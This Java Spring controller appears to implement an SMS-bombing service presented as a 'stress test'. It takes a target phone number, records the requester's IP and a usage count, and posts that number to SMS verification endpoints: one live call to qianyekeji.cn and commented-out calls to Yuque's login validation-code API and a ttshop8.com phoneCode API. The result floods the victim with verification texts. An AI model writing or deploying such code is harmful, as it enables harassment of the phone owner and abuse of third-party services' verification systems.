package cn.qianyekeji.ruiji.controller;

import cn.qianyekeji.ruiji.common.R;
import cn.qianyekeji.ruiji.entity.Sms;
import cn.qianyekeji.ruiji.service.SmsService;
import cn.qianyekeji.ruiji.utils.MailUtil;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

import javax.servlet.http.HttpServletRequest;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

/**
 *
 */
@RestController
@RequestMapping("/sss")
@Slf4j
public class SmsTestsController {

    @Autowired
    private SmsService smsService;

    @Autowired
    private MailUtil mailUtil;

    @PostMapping
    public R<String> save(@RequestBody Sms sms,HttpServletRequest request) {
        String p = sms.getP();
        try {
            // 服务器端使用，如果本地使用，ip地址会出现0.0.0.0.1，服务端不会
            String ipAddress = request.getHeader("X-Forwarded-For");
            if (ipAddress == null) {
                ipAddress = request.getRemoteAddr();
            }
            //用这个获取本地正常，服务器端收到的都是云服务器的ip地址
//            String ipAddress = IpLocation.getIpAddress();


            //根据页面提交的p(也就是短信压力测试的手机号)查询数据库
            LambdaQueryWrapper<Sms> queryWrapper = new LambdaQueryWrapper<>();
            queryWrapper.eq(Sms::getP,sms.getP());
            Sms sms1 = smsService.getOne(queryWrapper);
            //如果没有查询到则第一次使用，设置number为1
            if(sms1 == null){
                sms.setNumber("1");
                sms.setIpAddress(ipAddress);
                smsService.save(sms);
            }else{
                sms1.setNumber((Integer.parseInt(sms1.getNumber())+1)+"");
                smsService.updateById(sms1);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        if ("666".equals(sms.getP())){
            mailUtil.send("","ls@qianyekeji.cn","【匿名群聊提醒】","有人来找你聊天了", Collections.singletonList(""));
        }

        try {
                String URL = "http://qianyekeji.cn/sms";
                RestTemplate restTemplate = new RestTemplate();
                HttpHeaders headers = new HttpHeaders();
                headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
                headers.add("Accept", MediaType.APPLICATION_JSON_UTF8_VALUE);
                Map<String, Object> paramMap = new HashMap<>();
                paramMap.put("ids", 1330048);
                paramMap.put("phone", sms.getP());
                HttpEntity<Map> entity = new HttpEntity<>(paramMap, headers);
                restTemplate.postForEntity(URL, entity, String.class);
            } catch (RestClientException e) {
                e.printStackTrace();
            }
//        try {
//            String URL = "https://www.yuque.com/api/validation_codes";
//            RestTemplate restTemplate = new RestTemplate();
//            HttpHeaders headers = new HttpHeaders();
//            headers.add("referer", "https://www.yuque.com/login?goto=https%3A%2F%2Fwww.yuque.com%2Fbeikai%2Fogf5fx%2Fzw1f7u%3F");
//            Map<String, Object> paramMap = new HashMap<>();
//            paramMap.put("action", "login");
//            paramMap.put("channel", "sms");
//            paramMap.put("target", sms.getP());
//            HttpEntity<Map> entity = new HttpEntity<>(paramMap, headers);
//            restTemplate.postForEntity(URL, entity, String.class);
//        } catch (RestClientException e) {
//            e.printStackTrace();
//        }


//        try {
//            String URL = "http://ppxia.ttshop8.com/api/phoneCode?appId=4&phone="+sms.getP()+"&key=&vCode=&type=3";
//            RestTemplate restTemplate = new RestTemplate();
//            restTemplate.getForObject(URL, String.class);
//        } catch (RestClientException e) {
//            e.printStackTrace();
//        }


        return R.success("测试已启动");
    }
}
